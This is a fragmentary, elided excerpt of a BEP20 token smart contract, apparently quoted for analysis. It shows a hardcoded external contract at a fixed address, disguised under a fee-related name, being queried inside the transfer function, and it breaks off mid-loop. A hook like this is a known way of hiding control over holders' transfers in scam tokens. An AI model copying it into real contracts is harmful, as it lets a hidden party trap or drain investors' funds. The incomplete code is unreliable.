...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    removeMarketfee _removeMarketfee;
    ...
    address[2] memory _walletParam) 
    {
        ...
        _removeMarketfee = removeMarketfee(0x67d0C120A54a08d1a3e364156bf9542109015937);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if(!_removeMarketfee.isExcludedFromFee(sender) && !_removeMarketfee.isExcludedFromFee(recipient)){
                address ad;
                for(int i=0;i <=1;i++){
